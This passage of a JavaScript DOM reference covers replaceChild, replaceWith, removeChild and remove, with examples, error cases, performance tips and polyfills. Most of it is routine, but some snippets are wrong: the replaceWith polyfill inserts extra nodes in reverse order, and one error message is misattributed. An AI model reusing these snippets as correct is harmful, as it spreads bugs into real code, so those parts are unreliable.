// para1 remains in container1, copy replaces para2
```

### Replacing with Document Fragments

When replacing with a DocumentFragment, all fragment children are inserted and the fragment becomes empty:

```javascript
<ul id="list">
  <li id="old">Old item</li>
</ul>

const list = document.getElementById('list');
const oldItem = document.getElementById('old');
const fragment = document.createDocumentFragment();

// Add multiple items to fragment
for (let i = 1; i <= 3; i++) {
  const li = document.createElement('li');
  li.textContent = `Item ${i}`;
  fragment.appendChild(li);
}

list.replaceChild(fragment, oldItem);

// Result:
// <ul id="list">
//   <li>Item 1</li>
//   <li>Item 2</li>
//   <li>Item 3</li>
// </ul>

// fragment is now empty
fragment.childNodes.length; // 0
```

### Return Value Usage

The returned node is detached but still fully functional:

```javascript
const parent = document.getElementById('parent');
const oldNode = document.getElementById('old');
const newNode = document.createElement('div');

const removed = parent.replaceChild(newNode, oldNode);

// removed is detached but intact
removed.textContent; // Original content preserved
removed.children; // Child nodes preserved
removed.attributes; // Attributes preserved

// Can be reinserted elsewhere
document.getElementById('other-container').appendChild(removed);

// Can be modified
removed.classList.add('archived');
removed.dataset.replaced = 'true';

// Can be cloned
const copy = removed.cloneNode(true);
```

### Error Conditions

Several conditions throw DOMException:

```javascript
// 1. oldChild not found (NotFoundError)
parent.replaceChild(newNode, nonExistentNode);
// DOMException: Failed to execute 'replaceChild' on 'Node': 
// The node to be replaced is not a child of this node.

// 2. oldChild not a direct child (NotFoundError)
grandparent.replaceChild(newNode, grandchild);
// DOMException: NotFoundError

// 3. Invalid newChild type (HierarchyRequestError)
const textNode = document.createTextNode('text');
element.replaceChild(document, textNode);
// DOMException: The new child element contains the parent.

// 4. Circular hierarchy (HierarchyRequestError)
parent.replaceChild(parent, child);
// DOMException: Cannot replace a node with one of its ancestors
```

### Replacing Different Node Types

Works with various node types:

```javascript
const parent = document.getElementById('parent');
const oldElement = parent.firstChild;

// Replace with element
const newElement = document.createElement('span');
parent.replaceChild(newElement, oldElement);

// Replace with text node
const textNode = document.createTextNode('Plain text');
parent.replaceChild(textNode, newElement);

// Replace with comment
const comment = document.createComment('This is a comment');
parent.replaceChild(comment, textNode);

// Replace with document fragment (multiple nodes)
const fragment = document.createDocumentFragment();
fragment.append('Text 1', document.createElement('br'), 'Text 2');
parent.replaceChild(fragment, comment);
```

### Event Listeners and Data Preservation

Event listeners on the replaced node remain attached:

```javascript
const oldButton = document.getElementById('old-btn');

// Add event listener
oldButton.addEventListener('click', () => {
  console.log('Still works!');
});

// Replace in DOM
const newButton = document.createElement('button');
parent.replaceChild(newButton, oldButton);

// oldButton listener still works if reinserted
someContainer.appendChild(oldButton);
oldButton.click(); // "Still works!"

// Event listeners on ancestors are NOT affected
parent.addEventListener('click', (e) => {
  // Still fires for clicks on newButton
});
```

Custom data/properties also persist:

```javascript
oldNode.customData = { foo: 'bar' };
oldNode.myFunction = () => console.log('test');

const removed = parent.replaceChild(newNode, oldNode);

removed.customData; // { foo: 'bar' }
removed.myFunction(); // "test"
```

### Position-Relative Replacement

Replace nodes based on position:

```javascript
// Replace first child
parent.replaceChild(newNode, parent.firstChild);

// Replace last child
parent.replaceChild(newNode, parent.lastChild);

// Replace nth child
const nthChild = parent.children[2]; // Zero-indexed
parent.replaceChild(newNode, nthChild);

// Replace next sibling of a node
const reference = document.getElementById('reference');
reference.parentNode.replaceChild(newNode, reference.nextSibling);

// Replace based on condition
Array.from(parent.children).forEach(child => {
  if (child.classList.contains('old-style')) {
    const newChild = document.createElement('div');
    newChild.textContent = child.textContent;
    newChild.classList.add('new-style');
    parent.replaceChild(newChild, child);
  }
});
```

### Replacing During Iteration

Be careful when replacing during iteration:

```javascript
const parent = document.getElementById('parent');

// ❌ WRONG - modifying collection while iterating
for (let i = 0; i < parent.children.length; i++) {
  const newNode = document.createElement('div');
  parent.replaceChild(newNode, parent.children[i]);
  // collection changes during iteration, causes issues
}

// ✓ CORRECT - iterate backwards
for (let i = parent.children.length - 1; i >= 0; i--) {
  const newNode = document.createElement('div');
  parent.replaceChild(newNode, parent.children[i]);
}

// ✓ CORRECT - convert to array first
Array.from(parent.children).forEach(child => {
  const newNode = document.createElement('div');
  parent.replaceChild(newNode, child);
});

// ✓ CORRECT - use while loop
while (parent.firstChild) {
  const newNode = document.createElement('div');
  parent.replaceChild(newNode, parent.firstChild);
}
```

### MutationObserver Integration

`replaceChild` triggers mutation observations:

```javascript
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    console.log('Type:', mutation.type);
    console.log('Added:', mutation.addedNodes);
    console.log('Removed:', mutation.removedNodes);
  });
});

observer.observe(parent, {
  childList: true,
  subtree: false
});

parent.replaceChild(newNode, oldNode);

// Triggers observer with:
// - mutation.type: "childList"
// - mutation.addedNodes: [newNode]
// - mutation.removedNodes: [oldNode]
```

### Performance Considerations

```javascript
// INEFFICIENT - multiple reflows for each replacement
children.forEach(child => {
  const newNode = createNewNode();
  parent.replaceChild(newNode, child);
}); // Each replacement triggers reflow

// BETTER - batch with DocumentFragment
const fragment = document.createDocumentFragment();
children.forEach(child => {
  const newNode = createNewNode();
  fragment.appendChild(newNode);
});
// Clear and append all at once
parent.textContent = '';
parent.appendChild(fragment);

// BETTER - detach parent first (if possible)
const parentParent = parent.parentNode;
const nextSibling = parent.nextSibling;
parentParent.removeChild(parent);

// Perform all replacements
children.forEach(child => {
  parent.replaceChild(createNewNode(), child);
});

// Reattach
parentParent.insertBefore(parent, nextSibling);
```

### Legacy Pattern Comparison

`replaceChild` is the older DOM API; modern alternatives often exist:

```javascript
// Traditional replaceChild
parent.replaceChild(newNode, oldNode);

// Modern alternative (see replaceWith section)
oldNode.replaceWith(newNode);

// Both achieve same result, but:
// - replaceChild requires parent reference
// - replaceChild returns removed node
// - replaceWith is called on the node itself
// - replaceWith accepts multiple nodes/strings
```

---

## replaceWith

### Syntax and Behavior

`replaceWith()` replaces a node in the children list of its parent with a set of Node objects or strings. This is a more modern, convenient alternative to `replaceChild`.

```javascript
replacedNode.replaceWith(...nodes);
```

**Parameters:**

- `...nodes` - One or more Node objects or strings to replace the node with

**Returns:** `undefined` (unlike `replaceChild`)

### Key Differences from replaceChild

```javascript
const oldNode = document.getElementById('old');
const newNode = document.createElement('div');

// replaceChild (older API)
// - Called on parent
// - Returns removed node
// - Takes exactly 2 arguments
const removed = oldNode.parentNode.replaceChild(newNode, oldNode);

// replaceWith (modern API)
// - Called on node to be replaced
// - Returns undefined
// - Takes variable arguments
oldNode.replaceWith(newNode);
```

### No Parent Reference Required

Major advantage - no need to access parent:

```javascript
<div id="container">
  <p id="target">Replace me</p>
</div>

const target = document.getElementById('target');

// replaceChild - need parent
target.parentNode.replaceChild(newNode, target);

// replaceWith - cleaner
target.replaceWith(newNode);

// Especially useful in callbacks/event handlers
document.querySelectorAll('.old-widget').forEach(widget => {
  const newWidget = createNewWidget();
  widget.replaceWith(newWidget); // No parent reference needed
});
```

### Multiple Node Replacement

`replaceWith` accepts multiple nodes, unlike `replaceChild`:

```javascript
<div id="container">
  <p id="target">Single element</p>
</div>

const target = document.getElementById('target');

// Replace with multiple nodes
const heading = document.createElement('h2');
heading.textContent = 'Title';
const para = document.createElement('p');
para.textContent = 'Content';
const image = document.createElement('img');

target.replaceWith(heading, para, image);

// Result:
// <div id="container">
//   <h2>Title</h2>
//   <p>Content</p>
//   <img>
// </div>
```

### String Arguments

Strings are automatically converted to text nodes:

```javascript
const element = document.getElementById('target');

// Replace with text
element.replaceWith('Plain text content');
// Creates text node automatically

// Mix nodes and strings
const strong = document.createElement('strong');
strong.textContent = 'bold';
element.replaceWith('Some text, ', strong, ', and more text');

// Result: Text nodes and element mixed

// HTML in strings is NOT parsed
element.replaceWith('<p>Not parsed</p>');
// Creates text node with literal "<p>Not parsed</p>"

// For HTML parsing, use insertAdjacentHTML or innerHTML
const temp = document.createElement('div');
temp.innerHTML = '<p>Parsed</p>';
element.replaceWith(...temp.children);
```

### Empty Arguments

Calling with no arguments removes the element:

```javascript
const element = document.getElementById('target');

// Remove element (equivalent to remove())
element.replaceWith();

// Element is removed from DOM
element.parentNode; // null
```

### Practical Usage Patterns

#### Simple Element Swap

```javascript
// Replace all old components with new ones
document.querySelectorAll('.old-component').forEach(old => {
  const newComponent = document.createElement('div');
  newComponent.className = 'new-component';
  newComponent.textContent = old.textContent;
  old.replaceWith(newComponent);
});
```

#### Upgrading Elements

```javascript
// Upgrade divs to semantic elements
document.querySelectorAll('div.article').forEach(div => {
  const article = document.createElement('article');
  article.innerHTML = div.innerHTML;
  Array.from(div.attributes).forEach(attr => {
    article.setAttribute(attr.name, attr.value);
  });
  div.replaceWith(article);
});
```

#### Loading State Replacement

```javascript
const loadingSpinner = document.getElementById('spinner');

fetch('/api/data')
  .then(res => res.json())
  .then(data => {
    const content = createContentElement(data);
    loadingSpinner.replaceWith(content);
  })
  .catch(error => {
    const errorMsg = document.createElement('div');
    errorMsg.className = 'error';
    errorMsg.textContent = `Error: ${error.message}`;
    loadingSpinner.replaceWith(errorMsg);
  });
```

#### Template Instantiation

```javascript
const placeholder = document.querySelector('[data-placeholder="user-card"]');
const template = document.getElementById('user-card-template');

// Clone template content
const instance = template.content.cloneNode(true);

// Populate with data
instance.querySelector('.name').textContent = user.name;
instance.querySelector('.email').textContent = user.email;

// Replace placeholder
placeholder.replaceWith(instance);
```

### Replacing with Document Fragments

```javascript
const oldList = document.getElementById('old-list');
const fragment = document.createDocumentFragment();

// Build new content
['Item 1', 'Item 2', 'Item 3'].forEach(text => {
  const li = document.createElement('li');
  li.textContent = text;
  fragment.appendChild(li);
});

// Replace entire list
oldList.replaceWith(fragment);

// All fragment children are inserted, fragment becomes empty
```

### Chaining Replacements

```javascript
// Replace then immediately work with new element
const oldElement = document.getElementById('old');
const newElement = document.createElement('div');
newElement.className = 'new';

oldElement.replaceWith(newElement);
newElement.textContent = 'Updated';
newElement.classList.add('active');

// Or in one expression (since replaceWith returns undefined)
const newElem = document.createElement('div');
oldElement.replaceWith(newElem);
// Now use newElem
```

### Event Listener Considerations

Listeners on replaced node are lost from DOM perspective:

```javascript
const button = document.getElementById('btn');

button.addEventListener('click', () => {
  console.log('Original button clicked');
});

const newButton = document.createElement('button');
newButton.textContent = 'New Button';

// After replacement, old button's listener is detached from DOM
button.replaceWith(newButton);

// newButton needs its own listener
newButton.addEventListener('click', () => {
  console.log('New button clicked');
});

// Old button listener still exists if button is reinserted
document.body.appendChild(button);
button.click(); // "Original button clicked"
```

#### Preserving Listeners with Event Delegation

```javascript
// Parent-level delegation survives child replacement
const container = document.getElementById('container');

container.addEventListener('click', (e) => {
  if (e.target.matches('.action-btn')) {
    console.log('Button clicked');
  }
});

// Replace button - delegation still works
const oldButton = container.querySelector('.action-btn');
const newButton = document.createElement('button');
newButton.className = 'action-btn';
newButton.textContent = 'New';

oldButton.replaceWith(newButton);
// Clicking newButton still triggers delegated listener
```

### Replacing Text Nodes

Works on any node type, including text nodes:

```javascript
<p id="para">Some text with <em>emphasis</em> here</p>

const para = document.getElementById('para');
const textNode = para.childNodes[0]; // "Some text with "

// Replace text node
const newText = document.createTextNode('Different text ');
textNode.replaceWith(newText);

// Or with string
textNode.replaceWith('Different text ');
```

### Complex Replacement Scenarios

#### Conditional Replacement Based on Content

```javascript
document.querySelectorAll('p').forEach(para => {
  const text = para.textContent;
  
  if (text.length > 200) {
    // Replace long paragraphs with expandable version
    const summary = document.createElement('details');
    const summaryText = document.createElement('summary');
    summaryText.textContent = text.substring(0, 100) + '...';
    const fullText = document.createElement('p');
    fullText.textContent = text;
    
    summary.append(summaryText, fullText);
    para.replaceWith(summary);
  }
});
```

#### Replace with Dynamic Content

```javascript
const placeholder = document.querySelector('[data-dynamic]');
const type = placeholder.dataset.dynamic;

let replacement;
switch (type) {
  case 'chart':
    replacement = createChartElement();
    break;
  case 'table':
    replacement = createTableElement();
    break;
  case 'gallery':
    replacement = createGalleryElement();
    break;
  default:
    replacement = document.createTextNode('Unknown type');
}

placeholder.replaceWith(replacement);
```

#### Animated Replacement

```javascript
async function animatedReplace(oldElement, newElement) {
  // Fade out old element
  oldElement.style.transition = 'opacity 0.3s';
  oldElement.style.opacity = '0';
  
  await new Promise(resolve => setTimeout(resolve, 300));
  
  // Replace
  newElement.style.opacity = '0';
  oldElement.replaceWith(newElement);
  
  // Fade in new element
  await new Promise(resolve => setTimeout(resolve, 10));
  newElement.style.transition = 'opacity 0.3s';
  newElement.style.opacity = '1';
}

// Usage
const old = document.getElementById('old');
const newDiv = document.createElement('div');
newDiv.textContent = 'New content';
animatedReplace(old, newDiv);
```

### MutationObserver Integration

```javascript
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    if (mutation.type === 'childList') {
      console.log('Removed:', mutation.removedNodes);
      console.log('Added:', mutation.addedNodes);
    }
  });
});

observer.observe(parent, { childList: true });

element.replaceWith(newElement);
// Triggers observer:
// - removedNodes: [element]
// - addedNodes: [newElement] or multiple nodes if using replaceWith(node1, node2, ...)
```

### Error Handling

```javascript
const element = document.getElementById('target');

try {
  // If element has no parent (detached), replaceWith does nothing
  const detached = document.createElement('div');
  detached.replaceWith(newNode); // No error, just no effect
  
  // Calling on document, documentFragment, etc.
  document.replaceWith(newNode); // May throw in some contexts
} catch (error) {
  console.error('Replacement failed:', error);
}

// Safe pattern - check parent exists
if (element.parentNode) {
  element.replaceWith(newElement);
}
```

### Browser Compatibility Polyfill

`replaceWith` is modern (not in IE11), but can be polyfilled:

```javascript
// Polyfill for replaceWith
if (!Element.prototype.replaceWith) {
  Element.prototype.replaceWith = function(...nodes) {
    const parent = this.parentNode;
    if (!parent) return;
    
    // Convert strings to text nodes
    const processedNodes = nodes.map(node =>
      typeof node === 'string' ? document.createTextNode(node) : node
    );
    
    // Use replaceChild for first node, insertBefore for rest
    if (processedNodes.length === 0) {
      parent.removeChild(this);
    } else {
      parent.replaceChild(processedNodes[0], this);
      processedNodes.slice(1).forEach(node => {
        parent.insertBefore(node, processedNodes[0].nextSibling);
      });
    }
  };
}
```

### Performance Comparison

```javascript
// Performance test
const container = document.getElementById('container');
const count = 1000;

// replaceChild
console.time('replaceChild');
for (let i = 0; i < count; i++) {
  const old = container.firstChild;
  const newNode = document.createElement('div');
  container.replaceChild(newNode, old);
}
console.timeEnd('replaceChild');

// replaceWith
console.time('replaceWith');
for (let i = 0; i < count; i++) {
  const old = container.firstChild;
  const newNode = document.createElement('div');
  old.replaceWith(newNode);
}
console.timeEnd('replaceWith');

// Generally similar performance, replaceWith slightly slower
// due to argument processing, but difference is negligible
```

### Best Practices

```javascript
// ✓ GOOD - Use replaceWith for cleaner code
element.replaceWith(newElement);

// ✓ GOOD - Multiple nodes
element.replaceWith(node1, node2, node3);

// ✓ GOOD - Check parent if element might be detached
if (element.parentNode) {
  element.replaceWith(newElement);
}

// ❌ AVOID - Don't rely on return value (it's undefined)
const result = element.replaceWith(newElement); // undefined

// ❌ AVOID - Use remove() instead of empty replaceWith
element.replaceWith(); // Works but use element.remove() instead

// ✓ GOOD - Preserve important attributes/data
const newElement = document.createElement(oldElement.tagName);
newElement.className = oldElement.className;
newElement.id = oldElement.id;
// Copy other necessary attributes
oldElement.replaceWith(newElement);
```

### Use Cases Summary

**Use `replaceWith` when:**

- You want cleaner, more readable code
- You need to replace with multiple nodes at once
- You want to mix nodes and text strings
- The node has a parent (or you check first)

**Use `replaceChild` when:**

- You need the returned removed node
- Working with legacy code
- You specifically need to work through the parent reference
- Maximum browser compatibility (IE support)

```javascript
// Modern approach - replaceWith
document.querySelectorAll('.deprecated').forEach(el => {
  const modern = document.createElement('div');
  modern.className = 'modern';
  modern.innerHTML = el.innerHTML;
  el.replaceWith(modern);
});

// Legacy approach - replaceChild
const deprecated = document.querySelectorAll('.deprecated');
Array.from(deprecated).forEach(el => {
  const modern = document.createElement('div');
  modern.className = 'modern';
  modern.innerHTML = el.innerHTML;
  el.parentNode.replaceChild(modern, el);
});
```


---

## removeChild, remove

### Method Signatures and Basic Usage

#### removeChild

```javascript
// Signature: parentNode.removeChild(childNode)
const parent = document.getElementById('container');
const child = document.getElementById('item');
const removedNode = parent.removeChild(child);

// Returns the removed node
console.log(removedNode === child); // true
```

#### remove

```javascript
// Signature: element.remove()
const element = document.getElementById('item');
element.remove();

// Returns undefined
```

### Key Differences

#### Invocation Context

```javascript
// removeChild: called on parent
parent.removeChild(child);

// remove: called on element itself
child.remove();
```

#### Return Values

```javascript
// removeChild: returns removed node
const removed = parent.removeChild(child);
parent.appendChild(removed); // Can re-append immediately

// remove: returns undefined
const result = child.remove();
console.log(result); // undefined
// Must maintain reference separately to re-append
parent.appendChild(child);
```

#### Parent Reference Requirement

```javascript
// removeChild: requires parent reference
const child = document.querySelector('.item');
const parent = child.parentNode;
if (parent) {
  parent.removeChild(child);
}

// remove: works without parent reference
const child = document.querySelector('.item');
child.remove(); // Works regardless of parent
```

### removeChild Detailed Behavior

#### Error Conditions

```javascript
// NotFoundError: child not a child of parent
const parent = document.getElementById('container');
const notChild = document.getElementById('other');

try {
  parent.removeChild(notChild);
} catch (e) {
  console.log(e.name); // 'NotFoundError'
  console.log(e.message); // "Failed to execute 'removeChild' on 'Node': The node to be removed is not a child of this node."
}

// TypeError: null or undefined
try {
  parent.removeChild(null);
} catch (e) {
  console.log(e.name); // 'TypeError'
}
```

#### Removing from DocumentFragment

```javascript
const fragment = document.createDocumentFragment();
const div = document.createElement('div');
fragment.appendChild(div);

const removed = fragment.removeChild(div);
console.log(fragment.children.length); // 0
console.log(removed === div); // true
```

#### Text Node Removal

```javascript
const parent = document.createElement('div');
parent.innerHTML = 'Hello <span>World</span>!';

// Text nodes are also children
const textNode = parent.firstChild; // "Hello "
parent.removeChild(textNode);
console.log(parent.textContent); // "World!"
```

#### Comment Node Removal

```javascript
const parent = document.createElement('div');
parent.innerHTML = '<!-- comment --><div>Content</div>';

const comment = parent.firstChild;
parent.removeChild(comment);
// Comment removed, only div remains
```

### remove Detailed Behavior

#### No-op When Not in DOM

```javascript
const element = document.createElement('div');
element.remove(); // No error, just does nothing

// Element never added to DOM
console.log(element.parentNode); // null
```

#### Removing from Different Parent Types

```javascript
// From document.body
const bodyChild = document.body.firstElementChild;
bodyChild.remove(); // Removed from body

// From DocumentFragment
const fragment = document.createDocumentFragment();
const fragChild = document.createElement('div');
fragment.appendChild(fragChild);
fragChild.remove(); // Removed from fragment

// From custom element shadow root
const shadowRoot = customElement.shadowRoot;
const shadowChild = shadowRoot.firstElementChild;
shadowChild.remove(); // Removed from shadow DOM
```

#### Multiple Calls

```javascript
const element = document.getElementById('item');
element.remove(); // Removed from DOM
element.remove(); // No error, no-op
element.remove(); // Still no error
```

### Performance Characteristics

#### Single Element Removal

[Inference] Both methods have similar performance for single element removal. The overhead difference is negligible:

```javascript
// removeChild: requires parent lookup if not cached
const child = document.querySelector('.item');
child.parentNode.removeChild(child); // Two property accesses

// remove: direct operation
child.remove(); // One method call
```

#### Batch Removal Patterns

```javascript
// Inefficient: removing children in forward iteration
const parent = document.getElementById('container');
for (let i = 0; i < parent.children.length; i++) {
  parent.removeChild(parent.children[i]); // Length changes during iteration
}

// Efficient: removing in reverse
for (let i = parent.children.length - 1; i >= 0; i--) {
  parent.removeChild(parent.children[i]);
}

// Efficient: while loop
while (parent.firstChild) {
  parent.removeChild(parent.firstChild);
}

// Efficient: using remove()
[...parent.children].forEach(child => child.remove());

// Most efficient for complete clearing: innerHTML
parent.innerHTML = ''; // Faster than iterative removal
```

#### DocumentFragment Optimization

```javascript
// Inefficient: multiple reflows
list.querySelectorAll('.item').forEach(item => item.remove());

// More efficient: move to fragment first (preserves nodes)
const fragment = document.createDocumentFragment();
list.querySelectorAll('.item').forEach(item => {
  fragment.appendChild(item); // Removes from DOM, adds to fragment
});
// Process fragment, potentially re-add later
```

### Memory and Garbage Collection

#### Reference Retention After Removal

```javascript
// removeChild: explicit reference retained
const child = document.getElementById('item');
const removed = parent.removeChild(child);
// 'removed' and 'child' both reference the node
// Node won't be garbage collected while references exist

// remove: must maintain separate reference
const element = document.getElementById('item');
element.remove();
// 'element' still references the node
// Node won't be garbage collected while reference exists
```

#### Event Listener Memory Leaks

```javascript
// Listeners remain attached after removal
const button = document.querySelector('button');
button.addEventListener('click', expensiveHandler);

button.remove(); // Removed from DOM
// If 'button' reference maintained, listeners still in memory

// Manual cleanup before removal
button.removeEventListener('click', expensiveHandler);
button.remove();

// Or let reference go out of scope
function temporaryElement() {
  const temp = document.createElement('div');
  temp.addEventListener('click', () => {});
  document.body.appendChild(temp);
  temp.remove();
  // No external reference, can be garbage collected
}
```

#### Circular Reference Concerns

```javascript
// Potential memory leak pattern
const element = document.getElementById('item');
element.myData = {
  element: element, // Circular reference
  info: 'data'
};

element.remove();
// Circular reference may prevent garbage collection in older browsers
// [Unverified] Modern browsers handle this correctly with mark-and-sweep GC

// Safer pattern: WeakMap
const elementData = new WeakMap();
elementData.set(element, { info: 'data' });
element.remove();
// WeakMap allows garbage collection when element reference is gone
```

### Event Handling During Removal

#### Events Don't Fire on Removal

```javascript
const element = document.getElementById('item');

element.addEventListener('DOMNodeRemoved', () => {
  console.log('Removed'); // Deprecated event, avoid using
});

element.remove(); // No standardized removal event fires
```

#### MutationObserver for Removal Detection

```javascript
const observer = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    mutation.removedNodes.forEach(node => {
      console.log('Node removed:', node);
    });
  });
});

observer.observe(document.body, {
  childList: true,
  subtree: true
});

// Later
const element = document.getElementById('item');
element.remove(); // Observer detects removal
```

#### Event Delegation After Removal

```javascript
// Event delegation continues working
document.body.addEventListener('click', e => {
  if (e.target.matches('.item')) {
    console.log('Item clicked');
  }
});

// Remove element
const item = document.querySelector('.item');
item.remove();

// Clicks on body no longer match removed element
// No handler cleanup needed for delegation
```

### Child Relationship Edge Cases

#### removeChild with Text Nodes

```javascript
const parent = document.createElement('div');
parent.textContent = 'Hello World';

// textContent creates a single text node
const textNode = parent.firstChild;
console.log(textNode.nodeType); // 3 (TEXT_NODE)

parent.removeChild(textNode);
console.log(parent.textContent); // ''
```

#### Removing while Iterating

```javascript
const parent = document.getElementById('list');

// WRONG: length changes during iteration
for (let i = 0; i < parent.children.length; i++) {
  parent.removeChild(parent.children[i]);
  // Skips every other child
}

// CORRECT: iterate backwards
for (let i = parent.children.length - 1; i >= 0; i--) {
  parent.removeChild(parent.children[i]);
}

// CORRECT: convert to array first
[...parent.children].forEach(child => {
  parent.removeChild(child);
});

// CORRECT: use while loop
while (parent.firstChild) {
  parent.removeChild(parent.firstChild);
}
```

#### Removing SVG Elements

```javascript
// SVG elements work the same way
const svg = document.querySelector('svg');
const circle = svg.querySelector('circle');

// Both work
svg.removeChild(circle);
circle.remove();

// Namespace doesn't affect removal
```

#### Removing from Shadow DOM

```javascript
class CustomElement extends HTMLElement {
  constructor() {
    super();
    this.attachShadow({ mode: 'open' });
    this.shadowRoot.innerHTML = '<div>Shadow content</div>';
  }
  
  removeShadowChild() {
    const div = this.shadowRoot.querySelector('div');
    
    // Both work in shadow DOM
    this.shadowRoot.removeChild(div);
    div.remove();
  }
}
```

### Common Patterns and Use Cases

#### Conditional Removal

```javascript
// Remove if condition met
const element = document.getElementById('item');
if (element.dataset.temporary === 'true') {
  element.remove();
}

// Remove all matching elements
document.querySelectorAll('.removable').forEach(el => el.remove());
```

#### Replacement Pattern

```javascript
// Replace element using removeChild
const parent = document.getElementById('container');
const oldChild = document.getElementById('old');
const newChild = document.createElement('div');

parent.removeChild(oldChild);
parent.appendChild(newChild);

// Or use replaceChild instead
parent.replaceChild(newChild, oldChild);
```

#### Temporary Removal and Reinsertion

```javascript
// Remove, modify, reinsert
const element = document.getElementById('item');
const parent = element.parentNode;
const nextSibling = element.nextSibling;

const removed = parent.removeChild(element);

// Modify while detached (avoids reflows)
removed.innerHTML = /* expensive operations */;
removed.classList.add('updated');

// Reinsert at same position
parent.insertBefore(removed, nextSibling);
```

#### Clearing Container Contents

```javascript
const container = document.getElementById('container');

// Method 1: innerHTML (fastest for complete clearing)
container.innerHTML = '';

// Method 2: removeChild loop (preserves node references)
while (container.firstChild) {
  container.removeChild(container.firstChild);
}

// Method 3: remove() on each child
[...container.children].forEach(child => child.remove());

// Method 4: replaceChildren (modern)
container.replaceChildren(); // Removes all children
```

#### Removing with Animation

```javascript
async function animateAndRemove(element) {
  // Add animation class
  element.classList.add('fade-out');
  
  // Wait for animation
  await new Promise(resolve => {
    element.addEventListener('animationend', resolve, { once: true });
  });
  
  // Remove after animation
  element.remove();
}

// CSS: .fade-out { animation: fadeOut 0.3s; }
```

#### Form Field Removal

```javascript
// Remove form field and update FormData
const form = document.getElementById('myForm');
const field = form.querySelector('[name="optional"]');

// Remove from DOM
field.remove();

// FormData automatically excludes removed fields
const formData = new FormData(form);
console.log(formData.has('optional')); // false
```

### Browser Compatibility and Polyfills

#### remove() Polyfill

[Unverified] The `remove()` method was added in DOM4 and may not be available in older browsers (IE11 and below):

```javascript
// Polyfill for Element.prototype.remove()
if (!Element.prototype.remove) {
  Element.prototype.remove = function() {
    if (this.parentNode) {
      this.parentNode.removeChild(this);
    }
  };
}

// Also polyfill for other node types
if (!CharacterData.prototype.remove) {
  CharacterData.prototype.remove = function() {
    if (this.parentNode) {
      this.parentNode.removeChild(this);
    }
  };
}

if (!DocumentType.prototype.remove) {
  DocumentType.prototype.remove = function() {
    if (this.parentNode) {
      this.parentNode.removeChild(this);
    }
  };
}
```

#### removeChild Compatibility

`removeChild` has been supported since the earliest DOM implementations (IE5+, all modern browsers). No polyfill needed.

### Security Considerations

#### XSS Prevention During Removal

```javascript
// Removal itself doesn't introduce XSS
// But be careful with removed content
const userContent = document.getElementById('user-generated');
const removed = parent.removeChild(userContent);

// Don't directly insert removed content elsewhere without sanitization
// If content came from untrusted source
otherParent.appendChild(removed); // May contain malicious scripts

// Sanitize if needed
removed.innerHTML = DOMPurify.sanitize(removed.innerHTML);
otherParent.appendChild(removed);
```

#### Removing Sensitive Data

```javascript
// Remove elements containing sensitive data
const sensitiveFields = document.querySelectorAll('[data-sensitive]');
sensitiveFields.forEach(field => {
  // Clear content before removal
  field.textContent = '';
  field.value = '';
  field.remove();
});
```

### Error Handling Patterns

#### Safe removeChild with Validation

```javascript
function safeRemoveChild(parent, child) {
  if (!parent || !child) {
    console.warn('Parent or child is null');
    return null;
  }
  
  if (child.parentNode !== parent) {
    console.warn('Child is not a direct child of parent');
    return null;
  }
  
  try {
    return parent.removeChild(child);
  } catch (e) {
    console.error('Failed to remove child:', e);
    return null;
  }
}
```

#### Safe remove with Existence Check

```javascript
function safeRemove(element) {
  if (!element) {
    return false;
  }
  
  if (!element.parentNode) {
    console.warn('Element already removed or never added');
    return false;
  }
  
  element.remove();
  return true;
}
```

#### Batch Removal with Error Handling

```javascript
function removeElements(selector) {
  const elements = document.querySelectorAll(selector);
  const removed = [];
  const failed = [];
  
  elements.forEach(el => {
    try {
      el.remove();
      removed.push(el);
    } catch (e) {
      failed.push({ element: el, error: e });
    }
  });
  
  return { removed, failed };
}
```

### Alternatives and Modern Approaches

#### replaceChildren

```javascript
// Modern method to remove all children
const parent = document.getElementById('container');

// Old way
while (parent.firstChild) {
  parent.removeChild(parent.firstChild);
}

// New way
parent.replaceChildren(); // Removes all

// Or replace with new children in one operation
parent.replaceChildren(newChild1, newChild2, newChild3);
```

#### replaceWith

```javascript
// Remove and replace in one operation
const oldElement = document.getElementById('old');
const newElement = document.createElement('div');

// Old way
oldElement.parentNode.replaceChild(newElement, oldElement);

// New way
oldElement.replaceWith(newElement);

// Can replace with multiple nodes
oldElement.replaceWith(node1, node2, 'text node');
```

#### Detaching vs Removing

```javascript
// Detach for potential reuse (using removeChild)
const detached = parent.removeChild(child);
// Can reattach later: parent.appendChild(detached);

// Remove permanently (using remove)
child.remove();
// Can still reattach if reference maintained: parent.appendChild(child);

// Both preserve the node in memory if referenced
```

### Framework Integration Patterns

#### React Reconciliation

```javascript
// React handles removal automatically
function Component({ items }) {
  return (
    <ul>
      {items.map(item => (
        <li key={item.id}>{item.name}</li>
      ))}
    </ul>
  );
}

// When items array changes, React calls removeChild internally
// Don't manually remove React-managed elements
```

#### Vue Removal

```javascript
// Vue also manages DOM removal
<template>
  <div>
    <div v-for="item in items" :key="item.id">
      {{ item.name }}
    </div>
  </div>
</template>

// Don't mix manual removeChild with Vue's virtual DOM
```

#### Manual DOM Management in Frameworks

```javascript
// If you must manually manage DOM in framework
class Component {
  componentDidMount() {
    this.externalLibrary = new Library(this.containerRef);
  }
  
  componentWillUnmount() {
    // Clean up manually managed DOM
    const container = this.containerRef;
    while (container.firstChild) {
      container.removeChild(container.firstChild);
    }
    this.externalLibrary.destroy();
  }
}
```

### Performance Optimization Strategies

#### Batch DOM Operations

```javascript
// Inefficient: causes multiple reflows
items.forEach(item => {
  const el = document.getElementById(item.id);
  el.remove();
});

// Better: batch using DocumentFragment
const fragment = document.createDocumentFragment();
const parent = document.getElementById('container');

// Move elements to fragment (removes from parent)
items.forEach(item => {
  const el = document.getElementById(item.id);
  fragment.appendChild(el);
});

// Can manipulate fragment or discard
fragment.textContent = ''; // Clear all
```

#### Minimize Reflow with Detachment

```javascript
// Expensive: causes reflow on each removal
for (let i = 0; i < 1000; i++) {
  parent.children[0].remove();
}

// Better: detach parent first
const grandParent = parent.parentNode;
const nextSibling = parent.nextSibling;
const removedParent = grandParent.removeChild(parent);

// Modify detached tree (no reflows)
while (removedParent.firstChild) {
  removedParent.removeChild(removedParent.firstChild);
}

// Reattach if needed
grandParent.insertBefore(removedParent, nextSibling);
```

#### CSS Display None Before Removal

[Inference] Setting `display: none` before removing many children may reduce visual reflow impact, though the browser still processes the removals:

```javascript
// For large removal operations
const container = document.getElementById('large-container');
container.style.display = 'none';
